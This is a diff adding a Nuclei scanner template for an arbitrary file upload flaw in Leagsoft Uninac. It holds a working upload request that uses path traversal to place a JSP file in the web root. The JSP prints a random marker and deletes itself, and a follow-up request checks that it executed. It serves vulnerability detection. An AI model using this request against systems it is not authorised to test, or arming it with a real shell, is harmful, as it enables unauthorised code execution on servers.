@@ -1,0 +1,49 @@
+id: leagsoft-uninac-file-upload-cnvd-2020-62256
+info:
+  name: Leagsoft Uninac Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Leagsoft Uninac systems allow arbitrary file upload through the /uai/download/uploadfileToPath.htm endpoint,
+    enabling attackers to upload and execute malicious JSP scripts.
+  reference:
+    - https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/%E8%81%94%E8%BD%AF%E7%A7%91%E6%8A%80/%E8%81%94%E8%BD%AF%E5%87%86%E5%85%A5%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/
+variables:
+  rBoundary: '{{rand_text_alpha(15)}}'
+  rFilename: '{{rand_text_alpha(10)}}'
+  rContent: '{{md5(rand_text_alpha(20))}}'
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - '{{BaseURL}}/uai/download/uploadfileToPath.htm'
+    headers:
+      Content-Type: 'multipart/form-data; boundary={{rBoundary}}'
+    body: |
+      --{{rBoundary}}\r\nContent-Disposition: form-data; name="input_localfile"; filename="{{rFilename}}.jsp"\r\nContent-Type: text/plain\r\n\r\n<%out.print("{{rContent}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n--{{rBoundary}}\r\nContent-Disposition: form-data; name="uploadpath";\r\n\r\n../webapps/notifymsg/devreport/\r\n--{{rBoundary}}--\r\n
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "文件上传成功"
+      - type: word
+        part: header
+        words:
+          - "Path=/uai"
+  - id: verify-file
+    method: GET
+    path:
+      - '{{BaseURL}}/notifymsg/devreport/{{rFilename}}.jsp'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{{rContent}}'
